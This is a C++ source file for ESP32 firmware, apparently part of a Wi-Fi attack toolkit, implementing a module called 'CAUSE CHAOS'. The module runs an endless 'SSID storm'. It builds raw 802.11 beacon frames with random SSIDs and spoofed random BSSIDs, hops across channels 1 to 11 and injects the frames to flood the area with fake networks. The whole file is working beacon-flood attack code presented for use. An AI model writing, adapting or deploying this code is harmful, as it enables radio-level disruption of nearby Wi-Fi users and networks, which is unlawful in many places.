#include "CauseChaoS.h"
#include "../../include/config.h"
#include <Arduino.h>
#include <esp_wifi.h>
#include <cstring>

// ============================================================
//  CauseChaoS — implementation
// ============================================================

extern uint8_t g_currentChannel;

CauseChaoS::CauseChaoS() {
    _steps[0] = { "SSID storm", "Flood area with random beacon SSIDs" };
}

const char* CauseChaoS::getName()  const { return "CAUSE CHAOS"; }
StepStatus  CauseChaoS::getStatus() const { return _status; }

const PipelineStep* CauseChaoS::getSteps(uint8_t& count) const {
    count = STEP_COUNT;
    return _steps;
}

void CauseChaoS::init() {}

void CauseChaoS::run() {
    _stop   = false;
    _status = StepStatus::RUNNING;
    _steps[0].status = StepStatus::IDLE;

    _steps[0].status = StepStatus::RUNNING;
    bool ok = stepSsidStorm();
    _steps[0].status = ok ? StepStatus::OK : StepStatus::FAIL;

    _status = StepStatus::OK;
}

void CauseChaoS::stop() {
    _stop = true;
    if (_beaconTask) { vTaskDelete(_beaconTask); _beaconTask = nullptr; }
}

bool CauseChaoS::stepSsidStorm() {
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();

    xTaskCreate(beaconTaskFn, "chaos", 4096, this, 4, &_beaconTask);

    // Run indefinitely until stop() is called
    while (!_stop) delay(100);

    if (_beaconTask) { vTaskDelete(_beaconTask); _beaconTask = nullptr; }
    esp_wifi_stop();
    return true;
}

void CauseChaoS::beaconTaskFn(void* arg) {
    CauseChaoS* self = static_cast<CauseChaoS*>(arg);
    uint8_t frame[128];
    uint8_t fakeBssid[6];

    while (!self->_stop) {
        char fakeSsid[17];
        for (int i = 0; i < 16; i++)
            fakeSsid[i] = 'A' + (esp_random() % 26);
        fakeSsid[16] = '\0';

        for (int i = 0; i < 6; i++) fakeBssid[i] = esp_random() & 0xFF;
        fakeBssid[0] &= 0xFE;  // unicast
        fakeBssid[0] |= 0x02;  // locally administered

        uint8_t ch = 1 + (esp_random() % 11);
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        g_currentChannel = ch;

        int len = self->buildBeaconFrame(frame, fakeSsid, fakeBssid, ch);
        inject_frame(WIFI_IF_STA, frame, len);
        delay(BEACON_FLOOD_INTERVAL_MS);
    }
    vTaskDelete(nullptr);
}

int CauseChaoS::buildBeaconFrame(uint8_t* buf, const char* ssid,
                                   const uint8_t* bssid, uint8_t channel) {
    memset(buf, 0, 128);
    int off = 0;

    buf[off++] = 0x80; buf[off++] = 0x00;     // FC: Beacon
    buf[off++] = 0x00; buf[off++] = 0x00;     // Duration
    memset(buf + off, 0xFF, 6); off += 6;     // DA: broadcast
    memcpy(buf + off, bssid, 6); off += 6;    // SA
    memcpy(buf + off, bssid, 6); off += 6;    // BSSID
    buf[off++] = 0x00; buf[off++] = 0x00;     // Seq ctrl

    uint64_t ts = micros();
    memcpy(buf + off, &ts, 8); off += 8;      // Timestamp
    buf[off++] = 0x64; buf[off++] = 0x00;     // Interval: 100 TU
    buf[off++] = 0x01; buf[off++] = 0x04;     // Capability: ESS

    uint8_t ssidLen = strlen(ssid);
    buf[off++] = 0x00; buf[off++] = ssidLen;
    memcpy(buf + off, ssid, ssidLen); off += ssidLen;

    buf[off++] = 0x01; buf[off++] = 0x08;     // Supported rates IE
    buf[off++] = 0x82; buf[off++] = 0x84;
    buf[off++] = 0x8B; buf[off++] = 0x96;
    buf[off++] = 0x24; buf[off++] = 0x30;
    buf[off++] = 0x48; buf[off++] = 0x6C;

    buf[off++] = 0x03; buf[off++] = 0x01;     // DS parameter set
    buf[off++] = channel;

    return off;
}
